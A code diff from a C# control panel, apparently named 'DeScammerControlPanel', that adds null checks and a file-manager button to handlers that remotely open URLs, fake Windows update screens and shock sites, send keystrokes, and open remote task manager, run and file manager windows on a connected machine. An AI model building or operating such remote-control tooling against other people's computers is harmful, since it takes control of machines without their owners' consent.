@@ -144,11 +144,17 @@ namespace DeScammerControlPanel
         #region Troll Buttons - Websites
         private void btnWLeekspin_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://leekspin.com/" }));
         }
 
         private void btnWWin7Update_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
             Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win7/index.html" }));
             Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
@@ -156,6 +162,9 @@ namespace DeScammerControlPanel
 
         private void btnWWinXPUpdate_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
             Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/xp/index.html" }));
             Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
@@ -163,6 +172,9 @@ namespace DeScammerControlPanel
 
         private void btnWWin10Update_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
             Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win10/index.html" }));
             Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
@@ -170,6 +182,9 @@ namespace DeScammerControlPanel
 
         private void btnWMeatspin_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://meatspin.fr/" }));
         }
         #endregion
@@ -199,6 +214,9 @@ namespace DeScammerControlPanel
         #region Troll Buttons - Remote Programs
         private void btnTaskManager_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.TaskManagerForm = new TaskManager();
 
             Variables.TaskManagerForm.Show();
@@ -206,6 +224,9 @@ namespace DeScammerControlPanel
 
         private void btnRun_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.RunForm = new Run();
 
             Variables.RunForm.Show();
@@ -213,9 +234,22 @@ namespace DeScammerControlPanel
 
         private void btnMessageBox_Click(object sender, EventArgs e)
         {
+            if (Variables.Client == null)
+                return;
+
             Variables.OpenMessageBoxForm = new OpenMessageBox();
 
             Variables.OpenMessageBoxForm.Show();
+        }
+
+        private void btnFileManager_Click(object sender, EventArgs e)
+        {
+            if (Variables.Client == null)
+                return;
+
+            Variables.FileManagerForm = new FileManager();
+
+            Variables.FileManagerForm.Show();
         }
         #endregion
     }
